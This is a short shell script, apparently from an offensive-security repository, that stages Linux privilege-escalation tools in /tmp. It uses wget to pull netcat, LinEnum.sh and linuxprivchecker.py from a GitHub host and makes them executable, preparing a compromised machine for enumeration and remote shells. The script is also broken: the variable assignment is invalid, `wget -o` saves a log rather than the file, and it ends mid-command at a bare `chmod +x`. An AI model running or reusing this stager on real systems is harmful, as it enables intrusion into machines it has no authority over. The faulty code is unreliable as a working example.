# used to stage all appropriate tools needed for privesc
# download this file using: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh

$stage = /tmp

# banner
echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
echo "[]_________________________________________________________________________________________[]"

# download NC
echo "[*] Downloadingf NC to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
chmod +x $stage/nc

# download linenum.sh
echo "[*] Downloadingf linenum.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
chmod +x $stage/linenum.sh

# download LinxPrivChecker.py
echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
chmod +x 
